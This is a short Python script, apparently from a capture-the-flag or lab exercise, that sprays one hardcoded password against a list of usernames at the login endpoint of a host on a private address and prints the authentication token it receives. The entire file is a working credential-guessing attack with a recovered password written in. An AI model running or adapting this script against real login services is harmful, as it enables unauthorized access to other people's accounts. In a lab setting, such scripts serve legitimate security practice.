import requests as r

target = "http://10.10.10.137:3000"

headers = { "Content-Type": "application/json" }

usernames = ["root", "chihiro", "derry", "admin", "administrator", "Chihiro", "Derry"]
for username in usernames:
    data = {
        "username": username,
        "password": "Zk6heYCyv6ZE9Xcg"
    }
    auth = r.post(target+"/login", headers=headers, json=data)

    if "Forbidden" not in auth.text: 
        print("[JWT FOUND]\n\nUSERNAME:", username)
        print("\nTOKEN:", auth.json()["token"])
        break
 
